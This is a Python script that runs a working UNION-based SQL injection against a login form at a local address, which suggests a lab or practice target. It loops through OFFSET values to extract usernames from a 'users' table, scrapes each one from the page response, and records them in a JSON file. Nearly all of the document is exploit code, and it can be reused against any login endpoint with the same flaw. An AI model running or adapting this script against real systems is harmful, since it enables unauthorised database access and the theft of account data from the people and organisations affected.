import requests
from bs4 import BeautifulSoup
import json

url = "http://127.0.0.1:5000/login"
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
offset = 1
output_file = "responses.json"
user_list = []

try:
    with open(output_file, "w") as file:
        json.dump([], file)  

    while True:
        payload = f"login=fckubtch' UNION SELECT NULL, login, NULL, NULL FROM users LIMIT 2 OFFSET {offset}--&password=dsf"
        
        try:
            response = requests.post(url, headers=headers, data=payload)
            soup = BeautifulSoup(response.text, "html.parser")
            welcome_message = soup.find("p")
            if welcome_message:
                user_data = welcome_message.text
                start = user_data.find("(") + 1
                end = user_data.find(")")
                user_info = user_data[start:end]
                user_name = user_info.split(",")[1].strip().strip("'")
                if user_name not in user_list:
                    user_list.append(user_name)
                    with open(output_file, "r+") as file:
                        data = json.load(file)
                        data.append({"offset": offset, "user": user_name})
                        file.seek(0)
                        json.dump(data, file, indent=4)
                    print(f"Found user: {user_name}")
            offset += 1
        except Exception as e:
            with open(output_file, "r+") as file:
                data = json.load(file)
                data.append({"offset": offset, "error": str(e)})
                file.seek(0)
                json.dump(data, file, indent=4)
            print(f"An error occurred: {str(e)}")
            break
except Exception as e:
    print(f"Critical error: {str(e)}")
